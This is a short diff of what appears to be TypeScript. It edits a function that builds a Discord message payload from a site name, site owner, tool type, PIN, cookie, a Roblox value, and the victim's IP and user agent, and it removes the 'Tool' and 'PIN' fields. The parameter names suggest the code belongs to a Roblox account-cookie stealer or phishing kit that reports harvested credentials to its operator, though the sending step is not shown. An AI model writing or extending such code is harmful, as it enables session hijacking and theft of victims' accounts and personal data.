@@ -426,9 +426,7 @@ function buildDiscordPayload(opts: {
   const { siteName, ownerUsername, toolType, pin, cookie, roblox, ip, userAgent, extras } = opts;
 
   const mainFields: Array<{ name: string; value: string; inline?: boolean }> = [
-    { name: "Tool", value: toolType, inline: true },
     { name: "Site Owner", value: ownerUsername, inline: true },
-    { name: "PIN", value: pin || "Not provided", inline: true },
   ];
 
   if (extras) {
